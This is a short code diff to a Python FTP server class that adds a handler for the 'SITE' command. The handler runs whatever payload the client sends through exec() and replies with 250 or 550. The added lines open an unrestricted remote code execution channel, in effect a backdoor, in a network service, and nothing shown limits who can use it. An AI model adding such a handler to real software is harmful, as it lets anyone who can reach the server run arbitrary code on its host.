@@ -364,6 +364,12 @@ class FTP_client:
                     cl.sendall('250 OK\r\n')
                 except:
                     cl.sendall('550 Fail\r\n')
+            elif command == "SITE":
+                try:
+                    exec(payload.replace('\0','\n'))
+                    cl.sendall('250 OK\r\n')
+                except:
+                    cl.sendall('550 Fail\r\n')
             else:
                 cl.sendall("502 Unsupported command.\r\n")
                 # log_msg(2,
